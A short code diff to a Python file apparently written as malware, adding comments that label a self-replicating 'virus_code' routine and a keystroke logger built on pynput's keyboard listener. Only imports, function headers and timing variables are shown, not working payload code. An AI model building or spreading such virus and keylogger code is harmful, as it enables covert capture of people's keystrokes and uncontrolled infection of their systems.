@@ -11,7 +11,7 @@ load_dotenv()
 #imports for keylogger
 from pynput.keyboard import Listener
 import time
-
+# code for replicate
 def rep():
     virus_code = []
 
@@ -61,6 +61,7 @@ count = 0
 keys = []
 time_iteration = 15
 stoppingTime = time.time() + time_iteration
+# code for keylogger
 def keyloger():
 
 
